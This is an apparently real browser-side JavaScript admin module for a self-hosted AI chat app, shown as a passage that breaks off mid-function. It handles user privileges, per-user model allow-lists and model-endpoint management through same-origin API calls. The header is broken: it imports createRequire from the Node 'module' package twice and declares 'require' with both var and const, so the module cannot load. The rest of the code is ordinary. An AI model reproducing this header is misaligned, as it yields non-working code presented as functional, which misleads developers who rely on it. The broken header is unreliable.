// static/js/admin.js — Admin panel module (ES6)
// Admin-only: users, endpoints, MCP, RAG, embeddings, tokens, webhooks, features

import uiModule from './ui.js';
import settingsModule from './settings.js';
import { providerLogo } from './providers.js';
import { sortModelObjects } from './modelSort.js';
import { createRequire } from 'module';
import { createRequire } from 'module';

var require = createRequire(import.meta.url);
var module = { exports: {} };

const require = createRequire(import.meta.url);

let initialized = false;
let modalEl = null;
// When the user adds an endpoint, store its id so the next render of
// the endpoints list can flash a glow on that row. Cleared once the
// animation fires.
let _recentlyAddedEpId = null;

function el(id) { return document.getElementById(id); }
function esc(s) { return uiModule.esc(s); }

/* ═══════════════════════════════════════════
   USERS TAB
   ═══════════════════════════════════════════ */
const PRIV_LABELS = {
  can_use_agent: 'Agent mode',
  can_use_browser: 'Browser automation',
  can_use_bash: 'Shell / Python / Files',
  can_use_documents: 'Document editor',
  can_use_research: 'Deep research',
  can_generate_images: 'Image generation',
  can_manage_memory: 'Memory & skills',
};

async function loadUsers() {
  const list = el('adm-userList');
  try {
    const res = await fetch('/api/auth/users', { credentials: 'same-origin' });
    if (res.status === 401 || res.status === 403) { list.innerHTML = '<div class="admin-empty">Access denied</div>'; return; }
    const data = await res.json();
    if (!data.users || data.users.length === 0) { list.innerHTML = '<div class="admin-empty">No users found</div>'; return; }
    list.innerHTML = '';
    data.users.forEach(u => {
      const row = document.createElement('div');
      row.className = 'admin-user-row';

      // Header: name + badges + delete
      const header = document.createElement('div');
      header.style.cssText = 'display:flex;align-items:center;justify-content:space-between;cursor:pointer;padding:4px 0;';
      const initial = u.username.charAt(0).toUpperCase();
      header.innerHTML = `
        <div class="admin-user-info">
          <div style="width:28px;height:28px;border-radius:50%;background:color-mix(in srgb, var(--accent) 20%, var(--panel));display:flex;align-items:center;justify-content:center;font-size:12px;font-weight:600;flex-shrink:0;color:var(--accent);">${esc(initial)}</div>
          <div>
            <span class="admin-user-name">${esc(u.username)}</span>
            ${u.is_admin ? '<span class="admin-badge" style="margin-left:6px;">ADMIN</span>' : '<span style="font-size:10px;opacity:0.4;display:block;">Click to manage privileges</span>'}
          </div>
        </div>
        <div style="display:flex;gap:8px;align-items:center;">
          <button class="admin-btn-sm" data-adm-rename-user="${esc(u.username)}" style="font-size:11px;">Rename</button>
          ${u.is_admin ? '' : `<button class="admin-btn-delete" data-adm-del-user="${esc(u.username)}" style="font-size:11px;">Remove</button>`}
          ${u.is_admin ? '' : '<svg class="admin-user-chevron" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" style="opacity:0.3;transition:transform 0.2s,opacity 0.2s;"><polyline points="6 9 12 15 18 9"/></svg>'}
        </div>
      `;
      row.appendChild(header);

      // Privileges panel (hidden by default, not for admins)
      if (!u.is_admin) {
        const privPanel = document.createElement('div');
        privPanel.className = 'admin-priv-panel hidden';
        privPanel.style.cssText = 'padding:8px 0 4px;border-top:1px solid var(--border);margin-top:8px;';

        // Boolean toggles
        let html = '<div style="font-size:10px;text-transform:uppercase;letter-spacing:0.5px;opacity:0.35;font-weight:600;margin-bottom:4px;">Features</div>';
        for (const [key, label] of Object.entries(PRIV_LABELS)) {
          const checked = u.privileges && u.privileges[key] ? 'checked' : '';
          html += `<div style="display:flex;align-items:center;justify-content:space-between;padding:4px 0;">
            <span style="font-size:12px;">${label}</span>
            <label class="admin-switch" style="transform:scale(0.85);"><input type="checkbox" data-priv="${key}" data-user="${esc(u.username)}" ${checked}><span class="admin-slider"></span></label>
          </div>`;
        }
        // Rate limit
        html += '<div style="font-size:10px;text-transform:uppercase;letter-spacing:0.5px;opacity:0.35;font-weight:600;margin:10px 0 4px;">Limits</div>';
        const maxMsg = (u.privileges && u.privileges.max_messages_per_day) || 0;
        html += `<div style="display:flex;align-items:center;justify-content:space-between;padding:4px 0;">
          <div>
            <span style="font-size:12px;">Daily message limit</span>
            <div style="font-size:10px;opacity:0.4;">0 = no limit</div>
          </div>
          <input type="number" min="0" value="${maxMsg}" data-priv="max_messages_per_day" data-user="${esc(u.username)}" style="width:70px;padding:4px 6px;background:var(--bg);border:1px solid var(--border);border-radius:4px;color:var(--fg);font-size:12px;text-align:center;">
        </div>`;
        // Allowed models — checkbox list
        const allowedSet = new Set((u.privileges && u.privileges.allowed_models) || []);
        const allEmpty = allowedSet.size === 0;
        html += `<div style="padding:4px 0;">
          <div style="display:flex;align-items:center;justify-content:space-between;">
            <span style="font-size:12px;">Allowed models</span>
            <div style="display:flex;gap:8px;">
              <a href="#" class="priv-models-all" data-user="${esc(u.username)}" style="font-size:10px;opacity:0.5;">All</a>
              <a href="#" class="priv-models-none" data-user="${esc(u.username)}" style="font-size:10px;opacity:0.5;">None</a>
            </div>
          </div>
          <div style="font-size:10px;opacity:0.4;margin-bottom:4px;">${allEmpty ? 'All models allowed (no restrictions)' : allowedSet.size + ' model(s) allowed'}</div>
          <div class="priv-models-list" data-user="${esc(u.username)}">
            <span style="opacity:0.4;font-size:11px;">Loading models...</span>
          </div>
        </div>`;
        privPanel.innerHTML = html;
        row.appendChild(privPanel);

        // Toggle panel visibility + rotate chevron + load models
        let _modelsLoaded = false;
        header.addEventListener('click', (e) => {
          if (e.target.closest('.admin-btn-delete, [data-adm-rename-user]')) return;
          privPanel.classList.toggle('hidden');
          const chevron = header.querySelector('.admin-user-chevron');
          if (chevron) {
            const isOpen = !privPanel.classList.contains('hidden');
            chevron.style.transform = isOpen ? 'rotate(180deg)' : '';
            chevron.style.opacity = isOpen ? '0.7' : '0.3';
          }
          // Load models list on first expand
          if (!_modelsLoaded && !privPanel.classList.contains('hidden')) {
            _modelsLoaded = true;
            _loadModelsForUser(u.username, allowedSet, privPanel);
          }
        });

        // Wire privilege changes (boolean + number inputs, not model checkboxes)
        privPanel.querySelectorAll('[data-priv]').forEach(input => {
          const handler = async () => {
            const username = input.dataset.user;
            const key = input.dataset.priv;
            let value;
            if (input.type === 'checkbox') value = input.checked;
            else if (input.type === 'number') value = parseInt(input.value) || 0;
            else value = input.value;
            try {
              await fetch(`/api/auth/users/${encodeURIComponent(username)}/privileges`, {
                method: 'PUT', credentials: 'same-origin',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ [key]: value }),
              });
            } catch (e) { uiModule.showError('Failed to update privilege'); }
          };
          if (input.type === 'checkbox') input.addEventListener('change', handler);
          else input.addEventListener('change', handler);
        });
      }

      // Rename button
      const renameBtn = row.querySelector('[data-adm-rename-user]');
      if (renameBtn) {
        renameBtn.addEventListener('click', async (e) => {
          e.stopPropagation();
          const oldUsername = renameBtn.dataset.admRenameUser;
          const next = await uiModule.styledPrompt(`Rename "${oldUsername}"`, {
            defaultValue: oldUsername,
            placeholder: 'New username',
            confirmText: 'Rename',
          });
          const username = (next || '').trim();
          if (!username || username === oldUsername) return;
          try {
            const res = await fetch(`/api/auth/users/${encodeURIComponent(oldUsername)}/rename`, {
              method: 'PUT',
              credentials: 'same-origin',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ username }),
            });
            const data = await res.json().catch(() => ({}));
            if (!res.ok) {
              uiModule.showError(data.detail || 'Failed to rename user');
              return;
            }
            if (data.renamed_self) {
              window.location.reload();
              return;
            }
            loadUsers();
          } catch (err) {
            uiModule.showError('Failed to rename user');
          }
        });
      }

      // Delete button
      const delBtn = row.querySelector('[data-adm-del-user]');
      if (delBtn) {
        delBtn.addEventListener('click', async (e) => {
          e.stopPropagation();
          const username = delBtn.dataset.admDelUser;
          if (!await uiModule.styledConfirm(`Remove user "${username}"?`, { confirmText: 'Remove', danger: true })) return;
          const res = await fetch('/api/auth/users', { method: 'DELETE', credentials: 'same-origin', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ username }) });
          if (res.ok) loadUsers();
          else uiModule.showError('Failed to delete user');
        });
      }

      list.appendChild(row);
    });
  } catch (e) { list.innerHTML = '<div class="admin-error">Failed to load users</div>'; }
}

async function _loadModelsForUser(username, allowedSet, privPanel) {
  const listEl = privPanel.querySelector(`.priv-models-list[data-user="${username}"]`);
  if (!listEl) return;
  try {
    const res = await fetch('/api/models', { credentials: 'same-origin' });
    const data = await res.json();
    const allModels = [];
    (data.items || []).forEach(item => {
      if (item.offline) return;
      (item.models || []).forEach(mid => {
        allModels.push({ mid, epName: item.endpoint_name || '', display: mid.split('/').pop() });
      });
    });
    if (!allModels.length) {
      listEl.innerHTML = '<span style="opacity:0.4;font-size:11px;">No models available</span>';
      return;
    }
    const allEmpty = allowedSet.size === 0;
    listEl.innerHTML = sortModelObjects(allModels).map(m => {
      const checked = allEmpty || allowedSet.has(m.mid) ? 'checked' : '';
      return `<label>
        <input type="checkbox" class="priv-model-cb" data-mid="${esc(m.mid)}" ${checked}>
        <span>${esc(m.display)}</span>
        <span style="opacity:0.3;font-size:10px;margin-left:auto;">${esc(m.epName)}</span>
      </label>`;
    }).join('');

    // Save on change
    function _saveModels() {
      const checked = [];
      listEl.querySelectorAll('.priv-model-cb').forEach(cb => {
        if (cb.checked) checked.push(cb.dataset.mid);
      });
      // If all are checked, send empty array (= no restrictions)
      const value = checked.length === allModels.length ? [] : checked;
      const hint = privPanel.querySelector('.priv-models-list[data-user]')?.previousElementSibling?.querySelector('div[style*="opacity"]');
      if (hint) hint.textContent = value.length === 0 ? 'All models allowed (no restrictions)' : value.length + ' model(s) allowed';
      fetch(`/api/auth/users/${encodeURIComponent(username)}/privileges`, {
        method: 'PUT', credentials: 'same-origin',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ allowed_models: value }),
      }).catch(() => {});
    }
    listEl.querySelectorAll('.priv-model-cb').forEach(cb => cb.addEventListener('change', _saveModels));

    // All / None buttons
    privPanel.querySelector(`.priv-models-all[data-user="${username}"]`)?.addEventListener('click', (e) => {
      e.preventDefault();
      listEl.querySelectorAll('.priv-model-cb').forEach(cb => cb.checked = true);
      _saveModels();
    });
    privPanel.querySelector(`.priv-models-none[data-user="${username}"]`)?.addEventListener('click', (e) => {
      e.preventDefault();
      listEl.querySelectorAll('.priv-model-cb').forEach(cb => cb.checked = false);
      _saveModels();
    });
  } catch (e) {
    listEl.innerHTML = '<span style="opacity:0.4;font-size:11px;">Failed to load models</span>';
  }
}

function initSignupToggle() {
  const toggle = el('adm-signupToggle');
  fetch('/api/auth/status', { credentials: 'same-origin' })
    .then(r => r.json())
    .then(d => { toggle.checked = !!d.signup_enabled; })
    .catch(e => console.warn('Auth status fetch failed:', e));
  toggle.addEventListener('change', async () => {
    try {
      const res = await fetch('/api/auth/signup-toggle', { method: 'POST', credentials: 'same-origin' });
      const data = await res.json();
      toggle.checked = data.signup_enabled;
    } catch (e) { toggle.checked = !toggle.checked; }
  });
}

function initAddUser() {
  el('adm-addBtn').addEventListener('click', async () => {
    const msg = el('adm-addMsg');
    msg.textContent = ''; msg.className = '';
    const username = el('adm-newUsername').value.trim();
    const password = el('adm-newPassword').value;
    const is_admin = el('adm-newIsAdmin').checked;
    if (!username) { msg.textContent = 'Username required'; msg.className = 'admin-error'; return; }
    if (password.length < 8) { msg.textContent = 'Password must be at least 8 characters'; msg.className = 'admin-error'; return; }
    el('adm-addBtn').disabled = true;
    try {
      const res = await fetch('/api/auth/users', { method: 'POST', credentials: 'same-origin', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ username, password, is_admin }) });
      const data = await res.json();
      if (res.ok) { msg.textContent = 'User created'; msg.className = 'admin-success'; el('adm-newUsername').value = ''; el('adm-newPassword').value = ''; el('adm-newIsAdmin').checked = false; loadUsers(); }
      else { msg.textContent = data.detail || 'Failed'; msg.className = 'admin-error'; }
    } catch (e) { msg.textContent = 'Request failed'; msg.className = 'admin-error'; }
    el('adm-addBtn').disabled = false;
  });
}

/* ═══════════════════════════════════════════
   SERVICES TAB — Endpoints
   ═══════════════════════════════════════════ */
function _isLocalEndpoint(url) {
  if (!url) return false;
  try {
    const u = new URL(url);
    const h = u.hostname.toLowerCase();
    if (h === 'localhost' || h === '127.0.0.1' || h === '0.0.0.0') return true;
    if (h.endsWith('.local')) return true;
    if (/^10\./.test(h)) return true;
    if (/^192\.168\./.test(h)) return true;
    if (/^172\.(1[6-9]|2[0-9]|3[01])\./.test(h)) return true;
    // Tailscale CGNAT range (100.64.0.0/10 → 100.64.x–100.127.x). Servers
    // found via "Scan for Servers" come back as tailnet IPs, which are still
    // your own machines, so group them under Local rather than API.
    if (/^100\.(6[4-9]|[7-9]\d|1[01]\d|12[0-7])\./.test(h)) return true;
    // Single-label hostnames are LAN by convention.
    if (!h.includes('.')) return true;
    return false;
  } catch { return false; }
}

async function _refreshAfterEndpointChange(deletedEndpointId) {
  try {
    const sm = window.sessionModule;
    const pending = sm && sm.getPendingChat ? sm.getPendingChat() : null;
    if (deletedEndpointId && pending && String(pending.endpointId || '') === String(deletedEndpointId)) {
      if (sm.setPendingChat) sm.setPendingChat(null);
    }
  } catch (_) {}
  try {
    if (window.modelsModule && window.modelsModule.refreshModels) {
      await window.modelsModule.refreshModels(true);
    }
  } catch (_) {}
  try {
    window.dispatchEvent(new CustomEvent('ge:model-endpoints-updated', {
      detail: { deletedEndpointId: deletedEndpointId || null }
    }));
  } catch (_) {}
  try {
    if (window.sessionModule && window.sessionModule.updateModelPicker) {
      window.sessionModule.updateModelPicker();
    }
  } catch (_) {}
}

async function _selectAddedModelInChat(endpoint) {
  const modelId = endpoint && Array.isArray(endpoint.models) ? endpoint.models[0] : '';
  if (!modelId) return;
  try {
    if (window.modelsModule && window.modelsModule.refreshModels) {
      await window.modelsModule.refreshModels(true);
    }
  } catch (_) {}
  try {
    document.dispatchEvent(new CustomEvent('odysseus:auto-select-model', {
      detail: {
        endpointId: endpoint.id || '',
        endpointName: endpoint.name || '',
        modelId,
        url: endpoint.base_url || '',
      }
    }));
  } catch (_) {}
}

async function loadEndpoints() {
  const listLocal = el('adm-epList-local');
  const listApi = el('adm-epList-api');
  // Fallback to the legacy single list if the split containers don't exist
  // (older HTML or third-party embedding).
  const listLegacy = el('adm-epList');
  // Refresh model picker so new endpoints show up in chat
  if (window.modelsModule && window.modelsModule.refreshModels) {
    window.modelsModule.refreshModels(true);
    setTimeout(() => {
      if (window.sessionModule && window.sessionModule.updateModelPicker) {
        window.sessionModule.updateModelPicker();
      }
    }, 1500);
  }
  if (settingsModule && typeof settingsModule.refreshAiModelEndpoints === 'function') {
    settingsModule.refreshAiModelEndpoints();
  }
  try {
    const res = await fetch('/api/model-endpoints', { credentials: 'same-origin' });
    // Treat a non-OK response (e.g. 401/403 for non-admins, or backend
    // returning an error envelope) the same as "no endpoints yet": show the
    // empty state, not "Failed to load". The user just installed the app —
    // there's literally nothing to load, so the error read as broken UI.
    let data = [];
    if (res.ok) {
      try { data = await res.json(); } catch { data = []; }
    }
    if (!Array.isArray(data) || data.length === 0) {
      const empty = '<div class="admin-empty">None</div>';
      if (listLocal) listLocal.innerHTML = empty;
      if (listApi) listApi.innerHTML = '<div class="admin-empty">None</div>';
      if (listLegacy) listLegacy.innerHTML = empty;
      return;
    }
    const rowHtml = data.map(ep => {
      const visibleCount = ep.models.length;
      const totalCount = visibleCount + (ep.hidden_count || 0);
      // `ep.models` is the *visible* set — when every model is hidden it's
      // empty, but we still need to render the expand panel so the user can
      // un-hide them. Gate on the total instead.
      const hasModels = ep.online && totalCount > 0;
      const statusBadge = ep.status === 'empty'
        ? '<span class="admin-badge">no models</span>'
        : ep.online
          ? `<span class="admin-badge">${visibleCount}/${totalCount} models enabled</span>`
          : '<span class="admin-badge admin-badge-off">offline</span>';
      const justAddedClass = (_recentlyAddedEpId && String(ep.id) === _recentlyAddedEpId) ? ' adm-ep-just-added' : '';
      return `
        <div class="admin-user-row${ep.is_enabled ? '' : ' admin-ep-disabled'}${justAddedClass}" data-adm-ep-id="${ep.id}">
          <div style="display:flex;align-items:center;justify-content:space-between;${hasModels ? 'cursor:pointer;' : ''}padding:4px 0;" data-adm-ep-header="${ep.id}">
            <div class="admin-user-info" style="flex:1;flex-wrap:wrap;gap:0.3rem;">
              <span class="admin-user-name">${esc(ep.name)}</span>
              ${ep.model_type === 'image' ? '<span class="admin-badge" style="background:color-mix(in srgb, var(--accent) 20%, transparent);color:var(--accent);">Image</span>' : ''}
              ${statusBadge}
              ${ep.is_enabled ? '' : '<span class="admin-badge admin-badge-off">disabled</span>'}
              ${hasModels ? '<span style="font-size:10px;opacity:0.4;">Click to manage models</span>' : ''}
            </div>
            <div style="display:flex;gap:4px;align-items:center;">
              <button class="admin-btn-sm" data-adm-toggle-ep="${ep.id}">${ep.is_enabled ? 'Disable' : 'Enable'}</button>
              <button class="admin-btn-delete" data-adm-del-ep="${ep.id}" data-adm-ep-online="${ep.online ? '1' : '0'}">Delete</button>
              ${hasModels ? '<svg class="admin-user-chevron" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" style="opacity:0.3;transition:transform 0.2s,opacity 0.2s;"><polyline points="6 9 12 15 18 9"/></svg>' : ''}
            </div>
          </div>
          <div class="admin-ep-detail">${esc(ep.base_url)}${_isLocalEndpoint(ep.base_url) ? `<button type="button" class="admin-ep-copy-btn" data-adm-copy-url="${esc(ep.base_url)}" title="Copy URL" aria-label="Copy URL" style="background:none;border:none;padding:0 2px;margin-left:6px;cursor:pointer;color:inherit;opacity:0.45;vertical-align:-2px;line-height:1;"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg></button>` : ''}${ep.has_key ? ' (key set)' : ''}</div>
          ${hasModels ? `<div class="mcp-tools-panel hidden" data-adm-ep-models-panel="${ep.id}"></div>` : ''}
        </div>`;
    });
    // Partition rows into Local vs API for the split sections.
    // Subsections without any rows are hidden entirely (heading + all)
    // so empty groups don't take up vertical real estate.
    const _renderInto = (container, indices) => {
      if (!container) return;
      const section = container.closest('.adm-ep-section');
      if (!indices.length) {
        if (section) section.style.display = 'none';
        container.innerHTML = '';
        return;
      }
      if (section) section.style.display = '';
      container.innerHTML = indices.map(i => rowHtml[i]).join('');
    };
    const localIdx = [], apiIdx = [];
    data.forEach((ep, i) => (_isLocalEndpoint(ep.base_url) ? localIdx : apiIdx).push(i));
    // Sort each section: enabled endpoints first, disabled at the bottom.
    // Preserve original order within each group via stable sort.
    const _sortByEnabled = (a, b) => Number(!!data[b].is_enabled) - Number(!!data[a].is_enabled);
    localIdx.sort(_sortByEnabled);
    apiIdx.sort(_sortByEnabled);
    _renderInto(listLocal, localIdx);
    _renderInto(listApi, apiIdx);
    if (listLegacy) listLegacy.innerHTML = rowHtml.join('');
    // Iterate matching nodes across both containers.
    const queryAll = (sel) => {
      const out = [];
      [listLocal, listApi, listLegacy].forEach(c => {
        if (c) c.querySelectorAll(sel).forEach(n => out.push(n));
      });
      return out;
    };
    queryAll('[data-adm-toggle-ep]').forEach(btn => {
      btn.addEventListener('click', async (e) => { e.stopPropagation(); await fetch(`/api/model-endpoints/${btn.dataset.admToggleEp}`, { method: 'PATCH' }); loadEndpoints(); });
    });
    queryAll('[data-adm-copy-url]').forEach(btn => {
      btn.addEventListener('click', (e) => {
        e.stopPropagation();
        const url = btn.dataset.admCopyUrl || '';
        if (!url) return;
        uiModule.copyToClipboard(url).then(() => {
          // Brief icon swap to a checkmark so the user gets feedback that
          // the copy actually happened. Reverts after ~1.4s.
          const prev = btn.innerHTML;
          btn.innerHTML = '<svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>';
          btn.style.opacity = '1';
          setTimeout(() => { btn.innerHTML = prev; btn.style.opacity = ''; }, 1400);
        }).catch(() => {});
      });
    });
    queryAll('[data-adm-del-ep]').forEach(btn => {
      btn.addEventListener('click', async (e) => {
        e.stopPropagation();
        var epId = btn.dataset.admDelEp;
        var isOffline = btn.dataset.admEpOnline === '0';
        // Offline endpoints are already broken — skip the confirm dialog
        // entirely and delete immediately. The optimistic UI removal makes
        // the action feel instant.
        if (!isOffline) {
          var deps = [];
          try {
            var depRes = await fetch('/api/model-endpoints/' + epId + '/dependents', { credentials: 'same-origin' });
            var depData = await depRes.json();
            deps = depData.dependents || [];
          } catch (e) { /* proceed without warning */ }
          var msg = 'Delete this endpoint?';
          if (deps.length) {
            msg += '\n\nThe following settings use this endpoint and will be reset:\n— ' + deps.join('\n— ');
          }
          if (!await uiModule.styledConfirm(msg, { confirmText: 'Delete', danger: true })) return;
        }
        // Optimistic: remove from UI immediately
        const row = btn.closest('[data-adm-ep-id]');
        if (row) row.remove();
        fetch('/api/model-endpoints/' + epId, { method: 'DELETE' })
          .then(() => _refreshAfterEndpointChange(epId))
          .then(() => loadEndpoints())
          .catch(() => loadEndpoints());
      });
    });
    // Clear the just-added marker now that the row has been rendered
    // with the animation class — keeps the glow from re-firing on every
    // subsequent loadEndpoints() call (e.g. when toggling a model).
    if (_recentlyAddedEpId) _recentlyAddedEpId = null;
    // Models expand/collapse (click anywhere on card)
    queryAll('[data-adm-ep-id]').forEach(row => {
      const header = row.querySelector('[data-adm-ep-header]');
      if (!header) return;
      let _modelsLoaded = false;
      row.style.cursor = 'pointer';
      row.addEventListener('click', async (e) => {
        // Don't let interactions inside the expanded panel re-fire the
        // expand/collapse handler — the search box was getting closed
        // because clicking it bubbled up to here.
        if (e.target.closest('.admin-btn-sm, .admin-btn-delete, .mcp-tools-list, .mcp-tools-header, .mcp-tools-search, input, label')) return;
        const epId = header.dataset.admEpHeader;
        const panel = row.querySelector(`[data-adm-ep-models-panel="${epId}"]`);
        if (!panel) return;
        panel.classList.toggle('hidden');
        const chevron = row.querySelector('.admin-user-chevron');
        const isOpen = !panel.classList.contains('hidden');
        if (chevron) {
          chevron.style.transform = isOpen ? 'rotate(180deg)' : '';
          chevron.style.opacity = isOpen ? '0.7' : '0.3';
        }
        if (!_modelsLoaded && isOpen) {
          _modelsLoaded = true;
          // Our shared whirlpool spinner (consistent with the rest of the app).
          panel.innerHTML = '';
          let _modelsSpin = null;
          const _ld = document.createElement('span');
          _ld.style.cssText = 'opacity:0.55;font-size:11px;display:inline-flex;align-items:center;gap:8px;';
          _ld.appendChild(document.createTextNode('Loading models…'));
          try {
            const _sp = (await import('./spinner.js')).default;
            _modelsSpin = _sp.createWhirlpool(14);
            _modelsSpin.element.style.cssText = 'width:14px;height:14px;margin:0;display:inline-block;';
            _ld.appendChild(_modelsSpin.element);
          } catch (_) {}
          panel.appendChild(_ld);
          const _stopSpin = () => { try { _modelsSpin && _modelsSpin.stop(); } catch (_) {} };
          try {
            const res = await fetch(`/api/model-endpoints/${epId}/models`, { credentials: 'same-origin' });
            const models = await res.json();
            _stopSpin();
            const sortedModels = sortModelObjects(models);
            if (!sortedModels.length) { panel.innerHTML = '<span style="opacity:0.5;font-size:11px;">No models</span>'; return; }
            const hiddenSet = new Set(sortedModels.filter(m => m.is_hidden).map(m => m.id));
            const showSearch = sortedModels.length >= 8;
            panel.innerHTML = `<div class="mcp-tools-header">
              <span>Models</span>
              <span style="display:flex;gap:8px;align-items:center;">
                <span class="mcp-tools-count">${sortedModels.length - hiddenSet.size}/${sortedModels.length} enabled</span>
                <a href="#" data-ep-select-all="${epId}">All</a>
                <a href="#" data-ep-select-none="${epId}">None</a>
              </span>
            </div>${showSearch ? `<input type="search" class="mcp-tools-search" placeholder="Search ${sortedModels.length} models..." data-ep-search="${epId}">` : ''}<div class="mcp-tools-list">` + sortedModels.map(m =>
              `<label title="${esc(m.id)}" data-ep-model-row data-search="${esc((m.display + ' ' + m.id).toLowerCase())}" class="adm-model-row">
                <input type="checkbox" class="adm-cb-hidden" data-ep-model-id="${esc(m.id)}" ${!m.is_hidden ? 'checked' : ''}>
                <span class="adm-check-dot" aria-hidden="true"></span>
                <span>${esc(m.display)}</span>
              </label>`
            ).join('') + '</div>';
            const filterRows = (q) => {
              const needle = q.trim().toLowerCase();
              panel.querySelectorAll('[data-ep-model-row]').forEach(row => {
                row.style.display = (!needle || row.dataset.search.includes(needle)) ? '' : 'none';
              });
            };
            panel.querySelector(`[data-ep-search="${epId}"]`)?.addEventListener('input', (e) => filterRows(e.target.value));
            panel.querySelector(`[data-ep-select-all="${epId}"]`)?.addEventListener('click', (e) => {
              e.preventDefault();
              panel.querySelectorAll('[data-ep-model-row]').forEach(row => {
                if (row.style.display !== 'none') row.querySelector('input[type=checkbox]').checked = true;
              });
              _saveEpModelState(epId, panel);
            });
            panel.querySelector(`[data-ep-select-none="${epId}"]`)?.addEventListener('click', (e) => {
              e.preventDefault();
              panel.querySelectorAll('[data-ep-model-row]').forEach(row => {
                if (row.style.display !== 'none') row.querySelector('input[type=checkbox]').checked = false;
              });
              _saveEpModelState(epId, panel);
            });
            panel.querySelectorAll('input[type=checkbox]').forEach(cb => {
              cb.addEventListener('change', () => _saveEpModelState(epId, panel));
            });
          } catch (e) { _stopSpin(); panel.innerHTML = '<span class="admin-error" style="font-size:11px;">Failed to load models</span>'; }
        }
      });
    });
  } catch (e) {
    const err = '<div class="admin-error">Failed to load</div>';
    [listLocal, listApi, listLegacy].forEach(c => { if (c) c.innerHTML = err; });
  }
}

async function _saveEpModelState(epId, panel) {
  const hidden = [];
  panel.querySelectorAll('input[type=checkbox]').forEach(cb => {
    if (!cb.checked) hidden.push(cb.dataset.epModelId);
  });
  const total = panel.querySelectorAll('input[type=checkbox]').length;
  try {
    await fetch(`/api/model-endpoints/${epId}/models`, {
      method: 'PATCH',
      headers: { 'Content-Type': 'application/json' },
      credentials: 'same-origin',
      body: JSON.stringify({ hidden }),
    });
    const countLabel = panel.querySelector('.mcp-tools-count');
    if (countLabel) countLabel.textContent = `${total - hidden.length}/${total} enabled`;
    const row = panel.closest('[data-adm-ep-id]');
    if (row) {
      const badge = row.querySelector('.admin-badge');
      if (badge && !badge.classList.contains('admin-badge-off')) badge.textContent = `${total - hidden.length}/${total} models enabled`;
    }
    if (settingsModule && typeof settingsModule.refreshAiModelEndpoints === 'function') {
      settingsModule.refreshAiModelEndpoints();
    }
  } catch (e) { /* silent */ }
}

function initEndpointForm() {
  const provider = el('adm-epProvider');
  const urlInput = el('adm-epUrl');

  // Custom provider picker — mirrors the (now hidden) <select id="adm-epProvider">
  // so the rest of this function (which reads provider.value and dispatches
  // change events) keeps working unchanged.
  const picker = el('adm-provider-picker');
  const pickerBtn = el('adm-provider-btn');
  const pickerMenu = el('adm-provider-menu');
  const pickerCurrent = picker ? picker.querySelector('.adm-provider-current') : null;
  function _renderPickerMenu() {
    if (!pickerMenu) return;
    pickerMenu.innerHTML = Array.from(provider.options).map(o => {
      const logo = o.dataset.logo ? (providerLogo(o.dataset.logo) || '') : '';
      const active = o.value === provider.value ? ' active' : '';
      return `<div class="adm-provider-item${active}" role="option" data-value="${o.value.replace(/"/g, '&quot;')}">
        <span class="adm-provider-logo">${logo}</span>
        <span>${o.textContent}</span>
      </div>`;
    }).join('');
  }
  function _syncPickerCurrent() {
    if (!pickerCurrent) return;
    const opt = provider.selectedOptions[0] || provider.options[0];
    const logo = opt.dataset.logo ? (providerLogo(opt.dataset.logo) || '') : '';
    pickerCurrent.querySelector('.adm-provider-logo').innerHTML = logo;
    pickerCurrent.querySelector('.adm-provider-name').textContent = opt.textContent;
  }
  if (picker && pickerBtn && pickerMenu && pickerCurrent) {
    _renderPickerMenu();
    _syncPickerCurrent();
    if (provider.value && !urlInput.value) urlInput.value = provider.value;
    pickerBtn.addEventListener('click', (e) => {
      e.stopPropagation();
      pickerMenu.classList.toggle('hidden');
    });
    pickerMenu.addEventListener('click', (e) => {
      const item = e.target.closest('.adm-provider-item');
      if (!item) return;
      provider.value = item.dataset.value;
      provider.dispatchEvent(new Event('change', { bubbles: true }));
      pickerMenu.classList.add('hidden');
      _renderPickerMenu();
      _syncPickerCurrent();
    });
    document.addEventListener('click', (e) => {
      if (!picker.contains(e.target)) pickerMenu.classList.add('hidden');
    });
  }

  provider.addEventListener('change', () => {
    if (provider.value) urlInput.value = provider.value;
    else urlInput.value = '';
  });
  urlInput.addEventListener('input', () => {
    if (provider.value && urlInput.value.trim() !== provider.value) {
      provider.value = '';
      _renderPickerMenu();
      _syncPickerCurrent();
    }
  });
  function _normalizeBaseUrl(raw) {
    let u = raw.trim();
    // Fix common protocol typos
    u = u.replace(/^https?:\/(?!\/)/, m => m + '/');  // https:/ → https://
    u = u.replace(/^htp:/, 'http:').replace(/^htps:/, 'https:');
    u = u.replace(/^http:\/\/\//, 'http://');  // http:/// → http://
    u = u.replace(/^https:\/\/\//, 'https://');
    // Add http:// if no protocol
    if (!/^https?:\/\//.test(u)) u = 'http://' + u;
    // Strip trailing slashes
    u = u.replace(/\/+$/, '');
    // Strip trailing paths that shouldn't be in a base URL
    u = u.replace(/\/v1\/(models|chat\/completions|completions|messages)\/?$/i, '/v1');
    u = u.replace(/\/(models|chat\/completions|completions|v1\/messages)\/?$/i, '');
    u = u.replace(/\/api\/(chat|tags|generate)\/?$/i, '/api');
    // Fix double /v1/v1
    u = u.replace(/\/v1\/v1$/, '/v1');
    // Strip query params and fragments
    u = u.split('?')[0].split('#')[0];
    try {
      const parsed = new URL(u);
      if (parsed.hostname.endsWith('ollama.com')) {
        u = 'https://ollama.com/api';
      }
    } catch(e) {}
    // Ensure /v1 suffix for bare host:port URLs (not cloud providers)
    if (!u.includes('api.') && !u.includes('openrouter') && !u.includes('ollama.com') && !u.endsWith('/v1')) {
      try {
        const parsed = new URL(u);
